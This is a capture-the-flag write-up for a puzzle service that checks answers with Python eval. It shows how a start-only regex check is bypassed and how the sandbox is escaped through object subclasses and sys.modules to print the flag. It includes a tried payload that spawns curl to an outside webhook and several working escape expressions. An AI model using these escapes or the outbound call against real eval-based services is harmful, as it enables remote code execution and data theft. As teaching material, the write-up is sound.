## Challenge

> The Countle World Championships is coming! Time to step up your game and start training! It's just a measly 1,000,000 puzzles a day, anyone can do it.
> 
> nc challs.nusgreyhats.org 33401

## Solution

Upon connecting netcat to the server, we see a mathematical problem where, given one target number and a bunch of numbers, we are supposed to put the correct mathematical operations and brackets such that the result is equal to the target. Woah, perhaps I will need to write a script to solve all these puzzles to get the flag. But first, shall we appreciate the logic of how the programme checks the solution, yea?

```py
def checkAnswer(expr, target):
    result = eval(expr, {'FLAG':"no flag for you", "__builtins__": None})
    return result == target
```

Wow, what a genius way to check the answer! So, I tried keying in the target itself, but could not. Turns out,

```py
        for _ in BLACKLIST + [str(t)]:
            if _ in expr:
                return (print(format("~RBlacklisted word is not allowed: "+_+"~E")))
```

Ah yes, the target `t` itself is blacklisted, so I can't just key in the target to get the answer correct. But I can key in a sum of two numbers, eg if the target is `819`, I can key in `818 + 1`.

Alright, cool, but where is the flag being exposed?

```py
        if (_ == 2): 
            print(format(" ~GCongrats!! Here is your flag:\n   " + FLAG + "~E"))
```

Where `_` is the loop variable. So that means, I just need to solve 3 puzzles, and I should get the flag. Right? Not really! After solving 5 puzzles, the flag is still not there ...

That is when I realised, the value of `_` can never be `2`! Because of the blacklist check, if we are to pass the check, the value of `_` is always reassigned to `str(t)`! A string can never equate a number in Python. So, perhaps I need to somehow read this file in remote and send to my webhook.

Notice that in `checkAnswer` the `eval` is run with context `"__builtins__": None`. Which means: we can't access any built-in property or function in Python. So, the first idea that came to mind was to mimic Jinja-style syntax. Something like:

```py
''.__class__.__mro__[1].__subclasses__()[40]
```

I tried keying that in, but received: `That is not a valid expression. Read 'Help' for more info.` Where did that come from?

```py
        if (not match(r"[0-9+\-*/()]+", expr)):
            return (print(format("~RThat is not a valid expression. Read 'Help' for more info.~E")))
```

Ohh, my expression did not pass the regex! Looking at the regex, doesn't that mean that I can only key in numbers, math operations and brackets? Hrmmm, that means I can only key in mathematical expressions? That sux.

Wait, but how did my `818 + 1` expression manage to pass just now? That is interesting ...

Reading up the docs of `match` in Python, we see the following:

> The match() function is used for a pattern at the start of a given string

Ohh, it only checks the start! So I can simply wrap my expression around round brackets! It will still pass the regex check, and I can evaluate random code.

```py
(''.__class__.__mro__[1].__subclasses__())
```

You know, the difference between this challenge and regular Jinja challenge is that, I only see if the expression evaluates to a correct value, it does not give me any feedback of what the expression actually evaluates to. So, in regular Jinja challenges, the above expression will show me all the subclasses of `object` that I can choose from, then I can select the correct index of `subprocess.Popen`. Here it does not.

But, we can apply a filter to choose `subprocess.Popen`! The following should filter in the class. I can then instantiate the class with `curl` command to my webhook.

```py
([a for a in ''.__class__.__mro__[1].__subclasses__() if 'oPen'.lower() in a.__name__][0](['curl', 'https://webhook.site/928039f6-43f5-49f2-8b28-b6d4ee9295ee']))
```

> What are you doing with so many characters? Read 'Help' for more info.

Oops, what was I doing! That is evil. Let's try to shorten the expression a bit.

```py
([a for a in ''.__class__.mro()[1].__subclasses__() if 'sub' in a.__module__][0](['curl', 'https://webhook.site/928039f6-43f5-49f2-8b28-b6d4ee9295ee']))
```

Uhh, something went wrong. After a bit of debugging, turns out, the `subprocess.Popen` class is not available in the server! Well, after all, that was a wrong approach. I will need to append a GET param to obtain the content of the server file too, which I don't know how, and it will take way many more characters to do.

That was when I think, well I will need to reassign `_` to `2` so that the server will show me the flag. But eval does not allow multi-line code! For eg, the following won't work:

```py
a = 2; 819
```

After looking online for a while, I found out that, within an expression fed to eval, I can reassign a variable too! Using walrus operator.

```py
(_ := 2) + 816
```

But the above won't work yet! Because `_` declared in this expression will only be defined within `checkAnswer` function, not in `challenge` function. So, I need to somehow assign `_` under global scope, so that `challenge` will also receive the same value.

But, note that `__globals__` is not even accessible! Because of the context `"__builtins__": None`. Turns out, there is a way to access `__globals__`, by just accessing it from any function declaration. Something like `challenge.__globals__`! Okay, so here is an expression that can solve the challenge:

```py
(challenge.__globals__['_'] := 2) + 816
```

Oops, not yet! Because the walrus operator only allows assignment to a variable, not a key of a dictionary! So we will then have to try printing the flag. Something like:

```py
print(challenge.__globals__['FLAG'])
```

But `print` is already erased, and any attempt to access `__builtins__['print']`, even from `__globals__`, is not successful. Actually, ChatGPT says otherwise!

```py
[a for a in ''.__class__.mro()[1].__subclasses__() if 'WarningMessage' in a.__name__][0].__init__.__globals__['sys'].modules['builtins'].print
```

That is the `print` function! In a similar way, we can access the `FLAG` variable too.

```py
[a for a in ''.__class__.mro()[1].__subclasses__() if 'WarningMessage' in a.__name__][0].__init__.__globals__['sys'].modules['__main__'].FLAG
```

And now we can use the walrus operator to abstract out the common part of these two!

```py
(m := [a for a in ''.__class__.mro()[1].__subclasses__() if 'WarningMessage' in a.__name__][0].__init__.__globals__['sys'].modules)['builtins'].print(m['__main__'].FLAG)
```

That is a little bit higher than 160 characters. So we just need to cut down on the `'WarningMessage'` part, but choosing the precise characters so as to choose the correct class. And that is `Wa`. So, the final payload is:

```py
(m := [a for a in ''.__class__.mro()[1].__subclasses__() if 'Wa' in a.__name__][0].__init__.__globals__['sys'].modules)['builtins'].print(m['__main__'].FLAG)
```
